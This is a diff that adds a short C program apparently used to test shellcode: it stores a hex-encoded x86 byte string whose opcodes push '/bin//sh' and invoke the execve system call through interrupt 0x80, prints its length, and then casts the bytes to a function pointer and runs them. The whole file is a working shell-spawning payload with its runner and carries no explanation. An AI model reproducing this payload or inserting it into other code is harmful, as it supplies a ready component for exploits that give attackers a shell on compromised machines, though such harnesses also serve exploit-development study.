@@ -1,0 +1,11 @@
+#include <stdio.h>
+#include <string.h>
+ 
+char *shellcode = "\x83\xC0\x1E\xC6\x00\x80\x31\xC0\x6A\x68\x68\x6E\x2F\x2F\x73\x90\x68\x2F\x2F\x62\x69\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD";
+int main(void)
+{
+fprintf(stdout,"Length: %d\n",strlen(shellcode));
+(*(void(*)()) shellcode)();
+return 0;
+}
+
